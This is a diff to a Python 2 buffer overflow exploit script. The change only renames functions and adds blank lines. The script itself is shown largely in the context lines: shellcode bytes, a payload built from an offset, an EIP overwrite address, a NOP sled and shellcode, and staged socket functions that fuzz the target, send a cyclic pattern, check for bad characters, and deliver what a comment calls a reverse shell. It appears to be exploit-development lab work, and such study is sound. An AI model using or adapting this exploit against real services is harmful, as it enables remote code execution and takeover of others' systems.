@@ -97,12 +97,13 @@ shellcode = ("\xba\x4e\xf4\x95\xa3\xda\xc2\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
 payload = "\x90"*offset + eipaddr + nopsled + shellcode + "C"*(totallen - (offset + 4 + len(nopsled) + len(shellcode)))
 # ----------------------
 
-def func_checkregisters(buffer):
+def func_overwriteeip(buffer):
 	while True:
 		try:
 			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.settimeout(timeout)
 			s.connect((rhost, rport))
+			
 			#check registers for weird characters appended by application (if any)
 			s.send((buffer + '\r\n'))
 			if not s.recv(1024):	
@@ -120,6 +121,7 @@ def func_sendcyclic(pattern):
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(timeout)
 		s.connect((rhost, rport))
+		
 		#generate cyclic pattern of crashed buffer length (ceiling)
 		s.send((pattern + '\r\n'))
 		print "Sent cyclic pattern!"
@@ -130,11 +132,12 @@ def func_sendcyclic(pattern):
 		print "Error connecting to server!"
 		sys.exit()
 
-def func_sendbadcharcheck(checkeip):
+def func_sendeipbadcharcheck(checkeip):
 	try:
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(timeout)
 		s.connect((rhost, rport))
+		
 		#update payload with offset to check if eip is updated + check for bad characters
 		s.send((checkeip + '\r\n'))
 		print "Sent EIP + bad char check!"
@@ -150,6 +153,7 @@ def func_sendpayload(payload):
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(timeout)
 		s.connect((rhost, rport))
+		
 		#send payload with return addr to nopsled and reverse shell
 		s.send((payload + '\r\n'))
 		print "Sent payload! Shell please!"
@@ -163,13 +167,13 @@ def func_sendpayload(payload):
 
 if (sys.argv[1] == '1'):
 	print "Running function - check registers..."
-	func_checkregisters(buffer)
+	func_overwriteeip(buffer)
 if (sys.argv[1] == '2'):
 	print "Running function - send cyclic pattern..."
 	func_sendcyclic(pattern)
 if (sys.argv[1] == '3'):
 	print "Running function - send EIP + bad char check..."
-	func_sendbadcharcheck(checkeip)
+	func_sendeipbadcharcheck(checkeip)
 if (sys.argv[1] == '4'):
 	print "Running function - send payload..."
 	func_sendpayload(payload)
